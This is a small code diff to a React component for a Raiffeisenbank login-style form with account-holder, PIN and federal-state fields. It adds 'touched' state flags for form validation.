@@ -22,6 +22,9 @@ const Raiffeisenbank = () => {
   const [verfueger, setVerfueger] = useState("");
   const [pin, setPin] = useState("");
   const [selectOpen, setSelectOpen] = useState(false);
+  const [verfuegerTouched, setVerfuegerTouched] = useState(false);
+  const [pinTouched, setPinTouched] = useState(false);
+  const [bundeslandTouched, setBundeslandTouched] = useState(false);
   const dropdownRef = useRef<HTMLDivElement>(null);
 
   const selectHasValue = bundesland !== "";
